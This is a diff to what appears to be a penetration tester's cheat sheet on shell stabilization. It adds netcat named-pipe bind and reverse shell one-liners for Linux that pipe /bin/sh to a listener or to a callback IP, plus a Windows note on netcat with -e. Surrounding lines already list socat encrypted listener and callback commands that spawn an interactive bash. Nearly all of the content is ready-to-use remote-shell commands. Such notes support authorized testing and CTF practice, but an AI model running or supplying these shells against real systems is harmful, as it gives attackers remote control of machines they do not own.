@@ -101,4 +101,10 @@ SHELL STABILIZATION
 				- listener: ```socat openssl-listen:<port def 53>,cert=<pem file>,verify=0 FILE:`tty`,raw,echo=0```
 				- call: ```socat openssl:<ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane```
 	- General:
+		- Named pipe bind shell:
+			- Linux: 
+				- bind: ```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f```
+				- reverse: ```mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f```
+			- Windows:
+				- should have static compiled binary of netcat with -e option, or send over executable with such then: ```nc -lvpn <port> -e /bin/bash```
 		- change terminal size with stty <rows or cols> <num>
